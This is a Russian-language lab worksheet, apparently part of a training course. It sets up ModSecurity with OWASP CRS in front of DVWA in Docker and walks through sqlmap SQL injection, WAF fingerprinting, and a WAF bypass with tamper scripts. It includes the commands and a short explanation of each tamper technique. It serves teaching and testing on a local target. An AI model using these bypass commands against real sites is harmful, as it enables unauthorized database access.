# Этап 5 — Обход WAF (ModSecurity)

## Что делаем
Добавляем реальный WAF (ModSecurity + OWASP CRS) перед DVWA и показываем, что стандартный
запрос sqlmap блокируется, а с подобранными `--tamper`-скриптами — проходит.

## Подготовка

Поднять полный стек с WAF:
```bash
docker compose up -d
```

Убедиться, что DVWA теперь доступна **только** через `waf` (порт 8080), а не напрямую.

## Шаг 1 — атака без обхода (ожидаем блокировку)

```bash
sqlmap -u "http://waf:8080/vulnerabilities/sqli/?id=1&Submit=Submit#" \
  --cookie="PHPSESSID=<вставить>; security=low" \
  --dbs
```

Ожидаемо: WAF возвращает 403 или sqlmap сообщает, что не может подтвердить инъекцию —
это и есть подтверждение, что ModSecurity действительно фильтрует трафик.

## Шаг 2 — определяем WAF

```bash
sqlmap -u "http://waf:8080/vulnerabilities/sqli/?id=1&Submit=Submit#" \
  --cookie="PHPSESSID=<вставить>; security=low" \
  --identify-waf
```

## Шаг 3 — подбор tamper-скриптов

Пробуем несколько скриптов, которые модифицируют payload так, чтобы обойти сигнатуры WAF:

```bash
sqlmap -u "http://waf:8080/vulnerabilities/sqli/?id=1&Submit=Submit#" \
  --cookie="PHPSESSID=<вставить>; security=low" \
  --tamper=space2comment,randomcase,charencode \
  --dbs
```

Варианты tamper-скриптов, которые стоит попробовать и сравнить:
- `space2comment` — заменяет пробелы на `/**/`
- `randomcase` — меняет регистр ключевых слов (SeLeCt вместо SELECT)
- `charencode` — URL-кодирует символы payload'а
- `between` — заменяет `>`/`<` на `BETWEEN`

## Ожидаемый результат
- Зафиксирована блокировка запроса без обхода (403 / WAF detected)
- Определён тип WAF через `--identify-waf`
- Подобрана рабочая комбинация tamper-скриптов, при которой атака проходит

## Что приложить
- [ ] Скриншот блокировки (403 от ModSecurity) → `screenshots/05-waf-bypass/blocked.png`
- [ ] Скриншот `--identify-waf` → `screenshots/05-waf-bypass/identify-waf.png`
- [ ] Скриншот успешного обхода с tamper → `screenshots/05-waf-bypass/bypass-success.png`

## Вывод (заполнить после выполнения)
> _Какая комбинация tamper сработала, почему (что именно она меняет в запросе, из-за чего сигнатура WAF перестаёт срабатывать)._
